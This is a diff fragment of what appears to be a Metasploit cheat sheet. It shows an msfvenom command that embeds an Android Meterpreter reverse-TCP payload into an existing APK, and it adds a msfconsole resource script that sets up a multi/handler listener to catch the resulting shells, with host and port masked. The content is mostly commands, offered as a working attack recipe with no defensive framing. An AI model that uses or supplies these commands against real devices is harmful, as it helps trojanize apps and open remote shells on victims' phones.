@@ -70,3 +70,22 @@ Android Meterpreter reverse Payload
 Android Embed Meterpreter Payload
 <pre>$ msfvenom -x yourapp.apk android/meterpreter/reverse_tcp lhost=ip-address lport=port -o payload-name.apk </pre>
 
+#Save AS explort.rc
+Run command 
+
+
+<pre>
+# msfconsole -q -r 'export.rc'
+use exploit/multi/handler
+set PAYLOAD Payload name
+set LHOST *********
+set LPORT *******
+set ExitOnSession false
+set EnableStageEncoding true
+run -j
+</pre>
+
+..........................................read more
+
+
+
